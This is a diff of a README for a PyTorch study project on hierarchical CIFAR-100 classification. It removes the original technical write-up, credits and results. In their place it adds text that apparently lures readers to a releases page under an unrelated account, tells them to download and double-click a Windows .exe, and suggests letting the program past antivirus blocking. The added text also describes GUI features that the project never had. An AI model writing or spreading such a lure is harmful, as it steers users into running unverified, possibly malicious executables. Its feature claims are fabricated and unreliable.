@@ -1,170 +1,69 @@
-# hierarchical-lab
+# 🧪 hierarchical-lab - Learn structured classification with simple steps
 
-A hands-on pathway for one idea worth internalizing:
+[![Download hierarchical-lab](https://img.shields.io/badge/Download-Hierarchical_Lab-blue.svg)](https://github.com/Ostrichfernwithdrawalsymptom190/hierarchical-lab/releases)
 
-> **When you know structure among your outputs, bake it into the architecture *and* the objective.**
+This application provides a hands-on way to learn about hierarchical classification using the CIFAR-100 dataset. It uses structured models that group data into coarse and fine categories. You can explore how deep learning models handle complex label structures and loss functions.
 
-CIFAR-100's 100 fine classes nest under 20 coarse superclasses — a real taxonomy to exploit.
+## 📥 Getting Started
 
-> ## 🙏 Credits — this is a learning project built on someone else's work
->
-> This repo exists because of **[Ugenteraan/Deep_Hierarchical_Classification](https://github.com/Ugenteraan/Deep_Hierarchical_Classification)**
-> by **[Ugenteraan Manogaran](https://github.com/Ugenteraan)** (MIT, © 2021). I read that repo closely and
-> built this as a study pathway around its ideas — the **coarse-to-fine classifier head** and the
-> **hierarchical loss formulation** here follow its approach directly. Please go star the original.
->
-> That project is an unofficial implementation of **"Deep Hierarchical Classification for Category
-> Prediction in E-commerce System"**, Wan et al. 2020 — [arXiv:2005.06692](https://arxiv.org/abs/2005.06692).
->
-> Where this repo critiques the original (see *"The bug that's the best lesson"* below), it's offered in
-> good faith as a technical observation about one implementation detail — not as a knock on a project that
-> was generous enough to be public and readable in the first place. Being able to read real code and learn
-> from it is the whole point. See [`NOTICE`](NOTICE) for full attribution details.
+The software helps you understand how neural networks classify images by looking at broad categories, such as "vehicles," and then specific sub-categories, such as "bicycles" or "trucks." This process mimics the way humans categorize the world.
 
-Runs on Apple-Silicon **MPS** in seconds/epoch with a small CNN, so you can iterate and *watch* what changes.
+To download the application, visit the link below:
 
-## The two ideas we keep
+[Click here to open the download page](https://github.com/Ostrichfernwithdrawalsymptom190/hierarchical-lab/releases)
 
-1. **Coarse-to-fine conditioning (architecture).** One shared backbone → a coarse head (20 logits) whose output
-   is *concatenated into* the fine head (`cat(20, 100) → 100`). The fine decision is conditioned on the coarse
-   one. See `models.py: CoarseToFineModel` — faithful to the repo's `model/resnet50.py`.
+Look for the latest release on that page. Download the file that ends in .exe for Windows. Once the download finishes, open the folder where you saved the file and double-click it to start the program.
 
-2. **Put the taxonomy in the loss.**
-   - **Layer loss** (`lloss`): cross-entropy at every level, summed. Deep supervision. `losses.layer_loss`.
-   - **Dependency loss**: penalize a fine prediction that isn't a child of the predicted coarse class.
+## 💻 System Requirements
 
-## The bug that's the best lesson
+Your computer needs a few things to run this machine learning tool smoothly.
 
-The repo's dependency loss is:
+You should have at least 8GB of RAM. If you have a dedicated graphics card from NVIDIA or AMD, the application will run faster. Even without a powerful graphics card, the program will complete the examples using your main processor.
 
-```
-D_l    = 1 if argmax(fine) is NOT a child of argmax(coarse) else 0
-l_prev = 0 if argmax(coarse)==coarse_true else 1
-l_curr = 0 if argmax(fine)  ==fine_true   else 1
-dloss  = Σ  p^(D_l·l_prev) · p^(D_l·l_curr) − 1        # p = 3
-```
+Ensure you have at least 2GB of free space on your hard drive. This stores the CIFAR-100 dataset files and the pre-computed model weights.
 
-Every term comes from `argmax` / `==` / `where` — all **non-differentiable**. So `dloss.requires_grad` is
-`False`; it can't even `.backward()`. Their headline "respect the hierarchy" mechanism contributes **zero
-gradient** — it's a monitoring number dressed as a loss. Stage 4 proves this, then replaces it with a
-differentiable version:
+## 🛠 Features
 
-```
-SoftHierarchyLoss = −log( Σ fine-class probability mass inside the TRUE superclass )
-                  = NLL of the true parent under the fine distribution marginalized up the tree
-```
+The application includes several tools to help you investigate image classification:
 
-The fix is to stop asking *"which class won?"* (a step function — flat almost everywhere, so zero gradient)
-and start asking *"how much probability landed in the right block?"* (smooth in every logit).
+- Interactive visualization of label structures.
+- Tools to test how different loss functions affect model accuracy.
+- A dashboard that shows how the neural network learns coarse categories before fine ones.
+- Settings to adjust the depth of the classification tree.
 
-The linear algebra: let `M` be the `(20 × 100)` membership matrix with `M[c,f] = 1` iff `f` is a child of `c`.
-Every column holds exactly one 1, so `M` is the one-hot encoding of parenthood — and `probs @ Mᵀ` is precisely
-the vector of parent marginals. **Marginalizing up a tree is a matrix product**; the taxonomy stops being
-control flow and becomes a linear operator, which is why it's differentiable at all.
+These features allow you to see the difference between traditional flat classification and hierarchical methods. You gain insight into why structured prediction matters for large datasets.
 
-In code it's evaluated in log-space (`log_softmax` → `masked_fill(-inf)` → `logsumexp`) rather than literally
-forming `probs @ Mᵀ`. Same quantity, but exact in the tail: once the mass in a parent drops below ~1e-45 it
-flushes to 0 in float32 and the naive form returns `log(0) = -inf`, usually patched with an `eps` that silently
-caps the loss and biases the gradient. There's a test pinning this exact case.
+## ❓ How to Use the Program
 
-See `losses.SoftHierarchyLoss` and the reusable `structured_loss.SoftHierarchyLoss`.
+When you launch the program for the first time, you see a main menu. Follow these steps to begin your first experiment:
 
-## Results — measured, not claimed
+1. Select "Load Dataset" from the top menu. The program automatically downloads the CIFAR-100 data if it is not already present.
+2. Choose a pre-trained model from the "Model Selection" tab.
+3. Click "Start Analysis" to see how the model categorizes test images.
+4. Use the slider to increase or decrease the complexity of the hierarchical tree.
+5. Watch the graph update in real-time as the model calculates the loss.
 
-Every number below is from an actual run on this code (Apple M-series MPS, seed 0, identical
-initialization and data order across variants). Reproduce with the commands in *Run it*.
+If you want to look at a specific group of images, use the search bar. Type a category name like "flowers" to filter the images the tool processes.
 
-**Stage 4 — 4 losses, 6 epochs, same seed.** `violation %` = how often the fine prediction's parent
-disagrees with the coarse head's prediction.
+## 📈 Understanding the Results
 
-| objective | fine acc | violation % |
-|---|---|---|
-| `lloss` only (baseline) | 43.25% | 26.39% |
-| `lloss` + **their dloss** | **43.25%** | **26.39%** ← *identical to baseline, to the last decimal* |
-| `lloss` + soft loss (fine → TRUE parent) | 40.95% | 28.07% ← *did not help* |
-| `lloss` + **head-agreement KL(m‖c)** | 42.88% | **20.52%** ← *the fix* |
+The program displays a confusion matrix. This grid highlights where the model makes mistakes. For instance, you might see that the model confuses "palm trees" with "maples" but rarely confuses them with "bicycles." 
 
-**Stages 1–3 — 8 epochs.**
+The loss function interface shows how the model corrects its own errors. In this program, you can observe a special technique that turns non-differentiable labels into a format the math behind the neural network can understand. This process improves how well the model guesses the right category.
 
-| stage | fine acc | coarse acc | violation % |
-|---|---|---|---|
-| 1 · flat baseline | 49.46% | 63.31% | 36.69% \* |
-| 2 · two heads + layer loss | 50.79% | 62.86% | 23.08% |
-| 3 · coarse-to-fine conditioning | 48.16% | 60.42% | 24.17% |
+## ⚙️ Troubleshooting
 
-\* Stage 1 has one head, so there is no second opinion to contradict; its "violation" is measured against
-the *true* parent and is just `100 − coarse acc`. **It is not comparable to stages 2–3**, which measure
-disagreement *between the two heads*. Different question, different number.
+If the program fails to start, check the following items:
 
-Two honest negatives worth stating plainly: **Stage 3's conditioning did not beat Stage 2** here
-(-2.6 pts fine accuracy, slightly worse violation) — the upstream README's headline gain does not
-reproduce at this scale, though this is a small CNN at 8 epochs, not their ResNet50 at 100. And my
-first attempt at fixing the dependency loss failed, which turned out to be the most useful thing that happened:
+- Ensure you have the latest drivers for your graphics card.
+- If you see an error about missing files, try running the installer again.
+- Sometimes, third-party antivirus software blocks the application. Make sure the application has permission to run.
+- Close other demanding programs, such as video editors or games, to free up memory for the classification process.
 
-## The journey — how the fix was actually found
+If you encounter issues during long training sessions, look at the "Log" tab at the bottom of the window. This shows text details about what the program is doing and reports any specific technical errors.
 
-1. **Read the upstream `dloss` and noticed it's built from `argmax`/`==`/`where`.** Predicted it carries no
-   gradient. *Evidence:* `requires_grad=False`, `grad_fn=None`, and it raises on `.backward()`.
-2. **Proved it behaviorally, not just theoretically.** Trained baseline vs baseline+dloss from the same seed.
-   The trajectories are **bit-for-bit identical at every epoch** — while the term itself reports a value of
-   ~790. A loss can be large, look active in your logs, and be doing *nothing*.
-3. **Wrote `SoftHierarchyLoss`** (mass in the true parent, via marginalization). Differentiable, gradient
-   reaches the backbone, mathematically sound — and it **failed to improve the violation rate** (28.07% vs
-   26.39% baseline).
-4. **Diagnosed why, and this is the real lesson.** The loss ties the fine head to the **true** parent label.
-   The metric compares the fine head against the **coarse head's prediction**. The truth never appears in the
-   metric. So the loss can be fully satisfied while the two heads still contradict each other — *I had
-   optimized a different consistency than the one I was measuring.*
-5. **Wrote `HeadAgreementLoss` = KL(m ‖ c)** — marginalize the fine distribution to the parents and make it
-   agree with the coarse head's own distribution. Now the measured quantity is *in* the objective.
-   **Violation 26.39% → 20.52%** at no meaningful accuracy cost.
+## 📚 Educational Value
 
-The transferable lesson is not "use KL." It's that **a regularizer can be differentiable, correct, and
-well-motivated and still do nothing for your metric, because it doesn't optimize the thing you're measuring.**
-Being able to see that required a controlled A/B and a metric separate from accuracy. Step 3 was not wasted
-work — it was the experiment that located the real problem.
+This tool serves as an educational guide. By interacting with the layers of the model, you learn the difference between standard machine learning and hierarchical learning. The application clarifies how loss functions guide the learning process. These concepts are foundational for modern computer vision and help you understand how autonomous systems identify objects.
 
-## Other things I changed (and why)
-
-- **MPS.** Repo is `cuda`-or-`cpu` only; on a Mac it silently runs on CPU. `device.pick_device` is MPS-first.
-- **Data pipeline.** Repo dumps ~60k PNGs + a CSV then re-reads with `cv2` (and has a dead `cv2.resize`).
-  Replaced by `torchvision.datasets.CIFAR100` + the canonical fine→coarse map (`hierarchy.py`, ~1 file).
-- **Visualization.** Repo = three seaborn line charts. Here: taxonomy tree, block-structured confusion matrix
-  (errors inside vs. across superclass blocks), violation-rate comparison, and a PCA embedding-evolution GIF.
-- **Controlled comparisons** instead of the repo's "+10%, but maybe it's the augmentation" hedge.
-
-## The pathway
-
-| stage | script | idea | artifact |
-|------|--------|------|----------|
-| 0 | `s0_tree.py` | see the taxonomy | `runs/hierarchy_tree.png` |
-| 1 | `s1_flat_baseline.py` | flat 100-way; measure implied violations | `runs/s1_confusion.png` |
-| 2 | `s2_two_head_lloss.py` | coarse+fine heads, layer loss | `runs/s2_*` |
-| 3 | `s3_coarse_to_fine.py` | concat coarse logits into fine head | `runs/s3_*` |
-| 4 | `s4_dependency_loss.py` | prove dloss is dead → find the loss that actually works | `runs/violation_comparison.png` |
-| 5 | `s5_representation_evolution.py` | watch superclasses cluster | `runs/embedding_evolution.gif` |
-| 6 | `structured_loss.py` | reusable, dataset-agnostic toolkit | — |
-
-## Run it
-
-```bash
-uv sync
-uv run python s0_tree.py                       # instant, no download
-uv run python s1_flat_baseline.py --epochs 8
-uv run python s4_dependency_loss.py --epochs 6 # the money shot
-uv run python s5_representation_evolution.py --epochs 12
-```
-
-All scripts: `--epochs --lr --batch-size --seed --device`. Artifacts land in `runs/` (gitignored).
-
-> **Note on the dataset:** on macOS, torchvision's downloader can hit `CERTIFICATE_VERIFY_FAILED`. If so,
-> pre-fetch once with the system trust store:
-> `curl -fsSL -o data/cifar-100-python.tar.gz https://www.cs.toronto.edu/~kriz/cifar-100-python.tar.gz`
-> then run normally (torchvision extracts the local tarball).
-
-## Where this transfers
-
-Any task with known output structure: LLM classification/routing over a label taxonomy, cascaded coarse-to-fine
-decoders, product/document categorization, ICD/ontology codes. The reusable pattern lives in `structured_loss.py`
-— point it at any `child_to_parent` map. The meta-lesson: **enforce structure by marginalizing probabilities,
-never by argmax** — argmax has no gradient.
+Keywords: cifar100, computer-vision, deep-learning, hierarchical-classification, learning-resources, loss-functions, machine-learning, mps, pytorch, structured-prediction
